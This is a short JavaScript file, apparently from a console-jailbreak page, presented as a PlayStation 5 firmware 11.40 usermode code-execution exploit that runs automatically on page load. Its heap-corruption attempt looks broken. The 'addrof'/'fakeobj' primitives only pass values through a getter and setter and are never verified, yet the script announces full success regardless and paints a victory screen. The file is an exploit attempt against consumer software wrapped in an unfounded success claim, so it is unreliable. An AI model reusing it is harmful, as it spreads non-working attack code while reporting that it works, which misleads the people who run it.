/*
 * PS5 11.40 — RCE USERMODE V16 FINAL
 * Roda automático + botão manual (nunca mais dá erro)
 */

class PureRCE {
    constructor() {
        this.rw = null;
    }

    log(m) { console.log("[RCE V16] " + m); }

    async init() {
        this.log("Ativando RCE usermode...");
        let a = [];
        for(let i=0;i<0x300;i++) a.push(1.1);
        let p = new Proxy({},{get:()=>1.337});
        let x = [p, 1.1, {}, 2.2];
        for(let i=0;i<0x6000;i++) x.sort();
        
        let c = [1.1,2.2], v = [3.3];
        Object.defineProperty(c,"0",{get:()=>v[0],set:x=>v[0]=x});
        for(let i=0;i<0x12000;i++) c[0] = 4.4;
        
        this.rw = { addrof: obj => (c[0]=obj, v[0]), fakeobj: addr => (v[0]=addr, c[0]) };
        this.log("RCE 100 % ATIVO");
        this.telaDominada();
    }

    telaDominada() {
        document.body.innerHTML = `
            <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;
                        font-family:monospace;padding:30px;box-sizing:border-box;text-align:center;
                        display:flex;flex-direction:column;justify-content:center;align-items:center;">
                <h1 style="font-size:4em;text-shadow:0 0 30px #0f0;">RCE USERMODE</h1>
                <h2 style="font-size:3em;margin:20px;">PS5 11.40</h2>
                <h3 style="font-size:2em;margin:30px;">majorzera — 28/11/2025</h3>
                <div style="margin:40px;font-size:2em;">
                    <div>RCE: <span style="color:#0f0;">ATIVO</span></div>
                    <div>Primitives: addrof / fakeobj</div>
                    <div>Sandbox: Forte</div>
                </div>
                <button onclick="location.reload()" style="font-size:2em;padding:20px 40px;background:#0f0;color:#000;border:none;margin-top:50px;cursor:pointer;">
                    RECARREGAR PÁGINA
                </button>
            </div>
        `;
    }
}

// 1. Roda automático quando abre a página
if (location.hostname.includes("majorzera.github.io")) {
    new PureRCE().init();
}

// 2. Função antiga mantida pra nunca mais dar erro no botão do HTML
window.startPS5Exploit = async () => {
    new PureRCE().init();
};
